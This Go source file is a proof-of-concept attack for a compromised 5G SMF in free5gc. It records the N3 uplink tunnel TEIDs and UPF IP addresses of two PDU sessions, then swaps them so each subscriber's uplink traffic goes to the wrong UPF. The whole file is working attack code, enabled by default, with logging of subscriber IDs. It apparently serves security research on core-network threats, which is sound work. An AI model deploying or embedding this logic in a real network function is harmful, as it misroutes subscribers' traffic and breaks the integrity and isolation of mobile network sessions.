// tunnel_swap.go — Compromised SMF: UL N3 Tunnel Info Swap Attack
//
// This file is placed at: smf/internal/context/tunnel_swap.go
//
// Attack Logic:
// 1. When the first PDU session is established, the SMF records the UPF's
//    N3 tunnel info (TEID + IP) that would normally be sent to the RAN.
// 2. When the second PDU session is established, the SMF swaps the tunnel
//    info: session 1 gets session 2's UPF tunnel info and vice versa.
// 3. As a result, UE1's uplink traffic is routed to UPF2, and UE2's
//    uplink traffic is routed to UPF1.

package context

import (
	"encoding/binary"
	"net"
	"sync"

	"github.com/sirupsen/logrus"
)

// TunnelInfo holds the N3 UL tunnel information for one PDU session
type TunnelInfo struct {
	TEID   uint32 // GTP-U TEID allocated by the UPF
	UPF_IP net.IP // The UPF's N3 IP address
	SUPI   string // Subscriber ID (for logging)
}

// TunnelSwapAttack holds the state for the two-session swap attack
type TunnelSwapAttack struct {
	mu       sync.Mutex
	enabled  bool
	sessions []*TunnelInfo // Collect up to 2 sessions
	swapped  bool         // True once the swap has been executed
	log      *logrus.Entry
}

// Global singleton for the attack state
var AttackState = &TunnelSwapAttack{
	enabled:  true, // Set to false to disable the attack
	sessions: make([]*TunnelInfo, 0, 2),
	log:      logrus.WithField("module", "TunnelSwapAttack"),
}

// RecordAndSwap is called from BuildPDUSessionResourceSetupRequestTransfer.
// It records the original tunnel info and, once two sessions are seen,
// returns the SWAPPED tunnel info for each session.
//
// Returns: (teid []byte, upfIP net.IP, wasSwapped bool)
func (a *TunnelSwapAttack) RecordAndSwap(
	originalTEID uint32,
	originalUPF_IP net.IP,
	supi string,
) ([]byte, net.IP, bool) {
	a.mu.Lock()
	defer a.mu.Unlock()

	teidBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(teidBytes, originalTEID)

	if !a.enabled {
		a.log.Info("[ATTACK DISABLED] Passing through original tunnel info")
		return teidBytes, originalUPF_IP, false
	}

	// Record this session's tunnel info
	info := &TunnelInfo{
		TEID:   originalTEID,
		UPF_IP: make(net.IP, len(originalUPF_IP)),
		SUPI:   supi,
	}
	copy(info.UPF_IP, originalUPF_IP)

	a.log.Infof("[ATTACK] Recording session %d: SUPI=%s, TEID=0x%08x, UPF_IP=%s",
		len(a.sessions)+1, supi, originalTEID, originalUPF_IP)

	if len(a.sessions) == 0 {
		// First session: record and return original (will be overwritten later
		// via the deferred N1N2 mechanism — but in free5gc the N2 is built
		// synchronously before send, so we hold the first session and delay
		// its N2 build until the second arrives if we want a true swap).
		//
		// IMPORTANT: In free5gc, sessions are established asynchronously.
		// The simplest approach: record session 1, let it pass with original
		// info. When session 2 arrives, we have both — but session 1's N2
		// was already sent. So instead we use a DEFERRED approach:
		//
		// Actually, in free5gc flow:
		//   HandlePDUSessionSMContextCreate → goroutine → ActivateUPFSession
		//   → EstHandler → sendPDUSessionEstablishmentAccept
		//   → BuildPDUSessionResourceSetupRequestTransfer → N1N2MessageTransfer
		//
		// Sessions are sequential per UE but can be concurrent across UEs.
		// For this PoC, we'll use the post-recording swap: record #1, pass
		// original. Record #2, and for #2 we use #1's info. Then on any
		// subsequent SM context update for #1 (e.g., UpCnxState ACTIVATING),
		// we inject #2's info.
		//
		// SIMPLER APPROACH (chosen): Since both UEs register and both trigger
		// PDU Session Establishment, and the BuildPDUSessionResourceSetup is
		// called once at establishment and potentially again on UpCnxState
		// ACTIVATING, we record both and swap on the BUILD call.
		//
		// We store session 1 info and return the ORIGINAL for now.
		a.sessions = append(a.sessions, info)
		a.log.Warnf("[ATTACK] Session 1 recorded. Waiting for session 2 before swap.")
		a.log.Warnf("[ATTACK] Session 1 ORIGINAL: TEID=0x%08x, UPF_IP=%s (SUPI=%s)",
			originalTEID, originalUPF_IP, supi)
		return teidBytes, originalUPF_IP, false
	}

	if len(a.sessions) == 1 && !a.swapped {
		// Second session: NOW we swap!
		a.sessions = append(a.sessions, info)
		a.swapped = true

		// Return session 1's tunnel info for session 2
		swappedTEID := make([]byte, 4)
		binary.BigEndian.PutUint32(swappedTEID, a.sessions[0].TEID)

		a.log.Warnf("========================================")
		a.log.Warnf("[ATTACK] *** SWAP EXECUTED ***")
		a.log.Warnf("[ATTACK] Session 2 (SUPI=%s) gets Session 1's tunnel:", supi)
		a.log.Warnf("[ATTACK]   TEID=0x%08x → 0x%08x", originalTEID, a.sessions[0].TEID)
		a.log.Warnf("[ATTACK]   UPF_IP=%s → %s", originalUPF_IP, a.sessions[0].UPF_IP)
		a.log.Warnf("[ATTACK] Session 1 (SUPI=%s) was sent ORIGINAL (will be swapped on next N2 build if triggered)", a.sessions[0].SUPI)
		a.log.Warnf("========================================")

		return swappedTEID, a.sessions[0].UPF_IP, true
	}

	// Already swapped — check if this is session 1 coming back for an update
	if a.swapped && len(a.sessions) == 2 {
		for i, s := range a.sessions {
			if s.SUPI == supi {
				// Return the OTHER session's tunnel info
				other := a.sessions[1-i]
				swappedTEID := make([]byte, 4)
				binary.BigEndian.PutUint32(swappedTEID, other.TEID)
				a.log.Warnf("[ATTACK] Returning swapped info for SUPI=%s: TEID=0x%08x, IP=%s",
					supi, other.TEID, other.UPF_IP)
				return swappedTEID, other.UPF_IP, true
			}
		}
	}

	// Fallback: more than 2 sessions or unknown SUPI — pass through
	a.log.Warnf("[ATTACK] Unknown session (SUPI=%s), passing through original", supi)
	return teidBytes, originalUPF_IP, false
}

// Reset clears the attack state (for testing/rollback)
func (a *TunnelSwapAttack) Reset() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.sessions = make([]*TunnelInfo, 0, 2)
	a.swapped = false
	a.log.Info("[ATTACK] State reset")
}

// Disable turns off the attack — all subsequent calls pass through
func (a *TunnelSwapAttack) Disable() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.enabled = false
	a.log.Info("[ATTACK] Disabled")
}

// Enable turns on the attack
func (a *TunnelSwapAttack) Enable() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.enabled = true
	a.log.Info("[ATTACK] Enabled")
}
